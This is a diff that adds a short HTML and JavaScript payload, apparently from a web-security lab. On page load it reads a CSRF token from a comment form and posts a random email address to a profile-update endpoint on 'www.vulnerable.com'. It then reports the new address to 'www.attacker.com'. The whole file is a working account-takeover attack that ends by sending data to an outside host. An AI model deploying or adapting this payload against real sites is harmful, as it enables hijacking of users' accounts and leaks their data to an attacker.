@@ -1,0 +1,24 @@
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+function rndMail() {
+  return "test@" + Math.floor(Math.random() * 100) + ".com";
+}
+window.onload = function () {
+  let stolen_csrf = [...document
+      .getElementsByTagName("form")].filter((f) => {
+    return f.action.includes("/comment");
+  })[0].children[0].value;
+  let new_mail = rndMail()
+  axios.post('http://www.vulnerable.com:5000/profile/update-email', {
+      email: new_mail,
+      csrf_token: stolen_csrf,
+    }, {
+      headers: {
+        'Content-Type': 'multipart/form-data'
+      }
+    })
+    .then(function (_) {
+      axios.get("http://www.attacker.com:5000/leak?newmail=" + new_mail);
+    });
+}
+</script>
